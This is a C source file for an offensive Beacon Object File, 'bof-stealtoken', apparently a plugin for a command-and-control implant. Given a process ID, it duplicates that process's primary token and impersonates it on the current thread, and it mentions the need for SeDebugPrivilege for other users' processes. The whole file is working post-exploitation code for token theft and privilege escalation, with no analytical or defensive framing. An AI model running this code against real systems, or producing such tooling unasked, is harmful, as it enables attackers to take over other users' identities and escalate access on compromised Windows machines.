/*
 * bof-stealtoken <pid>
 *
 * Duplicate the primary token of a running process and impersonate it on the
 * current thread.  Needs PROCESS_QUERY_INFORMATION and, for processes owned
 * by other users, SeDebugPrivilege.  Undo with bof-reverttoken.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"
#include "tokenhelpers.h"

void go(char *args, int alen)
{
    datap parser;
    int pid;
    HANDLE hp, tok = NULL, dup = NULL;
    char line[512];

    BeaconDataParse(&parser, args, alen);
    pid = BeaconDataInt(&parser);
    if (pid <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "usage: stealtoken <pid>\n");
        return;
    }

    hp = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pid);
    if (!hp) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcess(%d) failed: %lu\n", pid,
                     (unsigned long)KERNEL32$GetLastError());
        return;
    }

    if (!ADVAPI32$OpenProcessToken(hp, TOKEN_DUPLICATE | TOKEN_QUERY |
                                       TOKEN_IMPERSONATE, &tok)) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hp);
        return;
    }

    if (!ADVAPI32$DuplicateTokenEx(tok, TOKEN_ALL_ACCESS, NULL,
                                   SecurityImpersonation, TokenImpersonation, &dup)) {
        BeaconPrintf(CALLBACK_ERROR, "DuplicateTokenEx failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(tok);
        KERNEL32$CloseHandle(hp);
        return;
    }

    if (!ADVAPI32$ImpersonateLoggedOnUser(dup)) {
        BeaconPrintf(CALLBACK_ERROR, "ImpersonateLoggedOnUser failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(dup);
        KERNEL32$CloseHandle(tok);
        KERNEL32$CloseHandle(hp);
        return;
    }

    bof_token_line(dup, line, sizeof(line));
    BeaconPrintf(CALLBACK_OUTPUT, "[+] impersonating PID %d: %s\n", pid, line);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] run bof-reverttoken to drop the impersonation\n");

    KERNEL32$CloseHandle(dup);
    KERNEL32$CloseHandle(tok);
    KERNEL32$CloseHandle(hp);
}
